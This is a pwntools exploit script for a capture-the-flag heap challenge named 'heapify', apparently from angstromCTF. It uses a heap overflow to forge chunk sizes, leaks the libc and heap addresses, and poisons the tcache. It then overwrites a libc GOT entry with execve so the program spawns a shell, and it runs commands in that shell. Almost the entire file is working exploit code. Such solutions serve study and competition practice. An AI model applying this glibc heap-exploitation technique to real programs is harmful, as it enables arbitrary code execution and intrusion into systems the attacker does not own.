from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./heapify_patched"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.actf.co", 31501 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

r = start()
ind = -1

def alloc(size, data):
    global ind
    sla(b"your choice: ", b'1')
    sla(b"chunk size: ", str(size).encode())
    sla(b"chunk data:", data)
    ind += 1
    return ind

def free(ind):
    sla("your choice:", b'2')
    sla("chunk index:", str(ind).encode())

def view(ind):
    sla("your choice:", b'3')
    sla("chunk index:", str(ind).encode())
    return rl()

def enc(val):
    return(heap ^ val)

sh = alloc(0x78, b"/bin/sh\0") # dud

# getting leaks

alloc(0x18, b"AAAA")
alloc(0x118, b"BBBB")
alloc(0x2f8, b"CCCC")
alloc(0x18, b"DDDD")

free(1)
alloc(0x18, b"A"*0x18+p64(0x421))
free(2)
alloc(0x118, b"BBBB")

libc.address = u64(view(3)[1:7].ljust(8, b"\x00")) - 0x21ace0

ic(hex(libc.address))

x = alloc(0x28, b"JUNK")
free(x)

heap = u64(view(3)[1:6].ljust(8, b"\x00"))
ic(hex(heap))

# got overwrite
a = alloc(0x68, b"JUNKJUNK1")
b = alloc(0x68, b"JUNKJUNK2")
q = alloc(0x68, b"JUNK")

free(q)
free(b)
free(a)
alloc(0x68, b"C"*0x68 + p64(0x71) + p64(enc(libc.address + 0x21a090)))

alloc(0x68, b"JUNK")
alloc(0x68, b"B"*8 + p64(libc.sym.execve))

sl(b"3")
sl(str(sh))
# sleep(0.5)
# sl('4')
sl('ls')

r.interactive()
